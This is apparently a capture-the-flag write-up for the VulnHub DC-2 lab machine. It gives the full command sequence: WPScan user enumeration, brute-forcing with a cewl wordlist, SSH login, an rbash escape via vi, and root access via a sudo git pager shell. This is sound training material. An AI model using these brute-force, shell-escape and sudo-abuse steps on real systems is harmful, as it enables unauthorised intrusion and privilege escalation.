# DC-2 — VulnHub Writeup

**Platform:** VulnHub  
**Difficulty:** Easy  
**Goal:** Find all 5 flags and gain root  
**Techniques:** WordPress enumeration, WPScan, Hydra, rbash escape, sudo git privilege escalation

---

## Table of Contents

1. [Setup & Reconnaissance](#1-setup--reconnaissance)
2. [Port Scanning](#2-port-scanning)
3. [Web Enumeration](#3-web-enumeration)
4. [WordPress User & Password Discovery](#4-wordpress-user--password-discovery)
5. [SSH Login & Flag 1](#5-ssh-login--flag-1)
6. [Restricted Shell Escape](#6-restricted-shell-escape)
7. [Lateral Movement — Switching Users](#7-lateral-movement--switching-users)
8. [Privilege Escalation via sudo git](#8-privilege-escalation-via-sudo-git)
9. [Root Flag](#9-root-flag)
10. [Flags Summary](#10-flags-summary)
11. [Key Takeaways](#11-key-takeaways)

---

## 1. Setup & Reconnaissance

DC-2 runs a WordPress site, but the domain `dc-2` must resolve correctly for WordPress to load properly. Before doing anything, add the target IP to your `/etc/hosts` file.

```bash
echo "192.168.x.x  dc-2" >> /etc/hosts
```

> Replace `192.168.x.x` with your actual target IP from the VM network.

Verify it loads in the browser at `http://dc-2`.

---

## 2. Port Scanning

```bash
nmap -sV -sC -p- 192.168.x.x
```

**Key results:**

| Port | Service | Details |
|------|---------|---------|
| 80   | HTTP    | Apache — WordPress site |
| 7744 | SSH     | OpenSSH |

> SSH is on a non-standard port (7744). Keep this in mind — you'll need it later.

---

## 3. Web Enumeration

Browsing to `http://dc-2` reveals a WordPress site. The first flag is hidden in plain sight — check the **Flag** page in the WordPress menu.

**Flag 1:** Found on the website itself (hints you to use `cewl` for wordlist generation).

```bash
cewl http://dc-2 -w cewl_wordlist.txt
```

This generates a custom wordlist based on words found on the site — exactly what the flag hints at.

---

## 4. WordPress User & Password Discovery

Use **WPScan** to enumerate users:

```bash
wpscan --url http://dc-2 --enumerate u
```

**Users found:**
- `admin`
- `jerry`
- `tom`

Now brute-force passwords using the `cewl` wordlist:

```bash
wpscan --url http://dc-2 -U users.txt -P cewl_wordlist.txt
```

> Create `users.txt` with the three usernames, one per line.

**Credentials found:**
- `jerry : adipiscing`
- `tom : parturient`

---

## 5. SSH Login & Flag 1

Log into WordPress and look around. `tom`'s account gives access to **Flag 2** in the WordPress dashboard.

Now SSH into the machine using `tom`'s credentials (remember the non-standard port):

```bash
ssh tom@192.168.x.x -p 7744
```

You'll immediately notice you're dropped into a **restricted shell (rbash)**. Limited commands, no `cd`, no path manipulation — yet.

**Flag 3** is in Tom's home directory:

```bash
cat flag3.txt
```

> Flag 3 hints to switch to the user `jerry`.

---

## 6. Restricted Shell Escape

`rbash` blocks most useful commands. We need to escape it.

**Method — vi escape:**

```bash
vi
# Inside vi:
:set shell=/bin/bash
:shell
```

Now you have a proper bash shell. Fix the PATH so standard commands work:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

---

## 7. Lateral Movement — Switching Users

Switch to `jerry` using the password found earlier:

```bash
su jerry
# Password: adipiscing
```

**Flag 4** is in Jerry's home directory:

```bash
cat flag4.txt
```

> Flag 4 hints at `sudo` — check what Jerry can run.

```bash
sudo -l
```

**Output:**
```
(root) NOPASSWD: /usr/bin/git
```

Jerry can run `git` as root without a password. That's the escalation path.

---

## 8. Privilege Escalation via sudo git

`git` has a built-in help pager that drops you into a shell. Abuse it:

```bash
sudo git help config
```

When the pager opens (usually `less`), type:

```
!/bin/bash
```

Press Enter. You now have a **root shell**.

Alternatively, use the GTFOBins one-liner:

```bash
sudo git -p help
# Then type: !/bin/bash
```

---

## 9. Root Flag

Navigate to `/root` and read the final flag:

```bash
cd /root
cat final-flag.txt
```

**Root achieved. Machine complete.**

---

## 10. Flags Summary

| Flag | Location | How Found |
|------|----------|-----------|
| Flag 1 | WordPress "Flag" page | Web enumeration |
| Flag 2 | WordPress dashboard (tom's account) | WPScan + brute-force |
| Flag 3 | `/home/tom/flag3.txt` | SSH login |
| Flag 4 | `/home/jerry/flag4.txt` | Lateral movement via `su` |
| Flag 5 | `/root/final-flag.txt` | Privilege escalation via `sudo git` |

---

## 11. Key Takeaways

- **Always check `/etc/hosts`** — WordPress can break entirely if the domain doesn't resolve. This is a common CTF trap.
- **CeWL is powerful** — a custom wordlist built from target content outperforms generic wordlists like `rockyou` for targeted attacks.
- **Non-standard ports matter** — SSH on 7744 is easy to miss without a full port scan (`-p-`).
- **rbash is rarely a hard wall** — `vi`, `awk`, `python`, and other editors/interpreters often provide escape vectors.
- **GTFOBins is your best friend** — any binary with sudo rights is worth checking. `git`, `vim`, `find`, `python` — all can spawn shells.

---

*Machine completed by Shahid | [GitHub](https://github.com/Shahid-git-09/vulnhub-writeups)*
